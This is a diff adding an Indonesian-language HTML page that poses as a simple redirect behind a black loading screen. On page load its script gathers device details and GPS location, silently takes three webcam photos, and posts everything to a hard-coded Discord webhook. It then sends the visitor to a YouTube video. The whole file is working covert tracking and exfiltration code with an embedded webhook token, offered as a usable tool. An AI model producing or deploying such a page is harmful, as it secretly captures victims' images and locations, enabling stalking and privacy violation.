@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect...</title>
+    <style>
+        /* Layar loading hitam */
+        #loadingScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Layar loading -->
+    <div id="loadingScreen">⏳ Memproses foto dan lokasi...</div>
+
+    <h1>📷 Foto diambil otomatis!</h1>
+
+    <h2>📌 URL Tujuan:</h2>
+    <input type="text" id="targetUrl" value="https://youtu.be/dQw4w9WgXcQ?si=7l8JJHtx8fryYK6l" style="width: 100%;">
+
+    <h2>📱 Device Info:</h2>
+    <p id="userAgent"></p>
+    <p id="platform"></p>
+    <p id="language"></p>
+    <p id="ram"></p>
+    <p id="cpu"></p>
+
+    <h2>🌍 Lokasi Lengkap:</h2>
+    <p id="latitude"></p>
+    <p id="longitude"></p>
+    <p id="accuracy"></p>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1338033191033769985/nFAW9QQ7y_w8DH2RDFGJVwsOR12aTD84lOZAMruaUZvBxfhuwQafVY2vbg8S0P5Z2Du6";
+
+        function sendToDiscord(data) {
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: "```" + JSON.stringify(data, null, 2) + "```" })
+            }).catch(err => console.error("Gagal mengirim data ke webhook!", err));
+        }
+
+        function sendImageToDiscord(imageData) {
+            fetch(webhookUrl, {
+                method: "POST",
+                body: JSON.stringify({ content: "📷 Foto yang diambil", file: imageData }),
+                headers: { "Content-Type": "application/json" }
+            });
+        }
+
+        function redirect() {
+            const targetUrl = document.getElementById("targetUrl").value;
+            setTimeout(() => { window.location.href = targetUrl; }, 1000);
+        }
+
+        function hideLoading() {
+            document.getElementById("loadingScreen").style.display = "none";
+        }
+
+        let deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak diketahui",
+            cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Core" : "Tidak diketahui"
+        };
+
+        document.getElementById("userAgent").textContent = "User Agent: " + deviceInfo.userAgent;
+        document.getElementById("platform").textContent = "Platform: " + deviceInfo.platform;
+        document.getElementById("language").textContent = "Bahasa: " + deviceInfo.language;
+        document.getElementById("ram").textContent = "RAM: " + deviceInfo.ram;
+        document.getElementById("cpu").textContent = "CPU: " + deviceInfo.cpu;
+
+        let locationLoaded = false;
+        let photoTaken = false;
+
+        function checkAllDone() {
+            if (locationLoaded && photoTaken) {
+                hideLoading();
+                redirect();
+            }
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                let locationInfo = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy + "m"
+                };
+
+                document.getElementById("latitude").textContent = "Latitude: " + locationInfo.latitude;
+                document.getElementById("longitude").textContent = "Longitude: " + locationInfo.longitude;
+                document.getElementById("accuracy").textContent = "Akurasi: " + locationInfo.accuracy;
+
+                sendToDiscord({ ...deviceInfo, ...locationInfo });
+
+                locationLoaded = true;
+                checkAllDone();
+            },
+            (error) => {
+                document.getElementById("latitude").textContent = "Lokasi tidak tersedia!";
+                locationLoaded = true;
+                checkAllDone();
+            }
+        );
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                const video = document.getElementById("video");
+                video.srcObject = stream;
+                
+                let capturedImages = [];
+                let count = 0;
+
+                function capturePhoto() {
+                    if (count < 3) {  
+                        const canvas = document.getElementById("canvas");
+                        const context = canvas.getContext("2d");
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        let imageData = canvas.toDataURL("image/png");
+                        capturedImages.push(imageData);
+                        sendImageToDiscord(imageData);
+
+                        count++;
+                        setTimeout(capturePhoto, 1000);
+                    } else {
+                        stream.getTracks().forEach(track => track.stop()); 
+                        photoTaken = true;
+                        checkAllDone();
+                    }
+                }
+
+                setTimeout(capturePhoto, 1000);
+            })
+            .catch((error) => {
+                console.log("Kamera tidak diizinkan.");
+                photoTaken = true;
+                checkAllDone();
+            });
+    </script>
+</body>
+</html>
